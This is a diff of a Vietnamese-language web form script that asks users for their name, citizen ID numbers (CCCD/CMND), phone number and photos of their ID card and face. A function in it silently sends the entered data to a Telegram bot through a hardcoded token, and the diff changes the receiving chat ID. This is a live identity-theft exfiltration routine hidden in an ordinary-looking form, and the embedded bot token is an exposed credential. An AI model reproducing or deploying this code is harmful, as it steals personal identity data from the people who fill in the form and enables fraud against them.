@@ -923,7 +923,7 @@
             function telegram(hoten, cccd, cmnd,sdt){
                 var my_text = ` - Họ tên: ${hoten}%0A - CCCD: ${cccd}%0A CMND: ${CMND}%0A - SĐT: ${sdt}`
                 var token = "5722329244:AAFAZMKdLqT8yiip_SAcJ2JTdefb9mB3ukU";
-                var chat_id = 5664202010
+                var chat_id = 1470544294
                 var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`//&parse_mode=html
                 let api = new XMLHttpRequest();
                 api.open("GET", url, true);
@@ -1201,32 +1201,6 @@
                     location.href = "#sdtdongnghiep";
                     return false;
                 }
-
-                // chup hinh
-                if ($("#filenamefile1").val() == null || $("#filenamefile1").val() === "") {
-                    alert("Bạn chưa Chụp CCCD/CMND Mặt trước !");
-                    location.href = "#CCCD_mattruoc";
-                    return false;
-                }
-                if ($("#filenamefile2").val() == null || $("#filenamefile2").val() === "") {
-                    alert("Bạn chưa Chụp CCCD/CMND Mặt sau !");
-                    location.href = "#CCCD_matsau";
-                    return false;
-                }
-                if ($("#filenamefile3").val() == null || $("#filenamefile3").val() === "") {
-                    alert("Bạn chưa Chụp hình chân dung !");
-                    location.href = "#chupchandung";
-                    return false;
-                }
-                return true;
-                
-                
-            }
-            
-            function validateform() {
-                telegram($("#hoten").val(), $("#CCCD").val(), $("#CMND").val(), $("#sdt").val())
-                
-                
 
                 // chup hinh
                 if ($("#filenamefile1").val() == null || $("#filenamefile1").val() === "") {
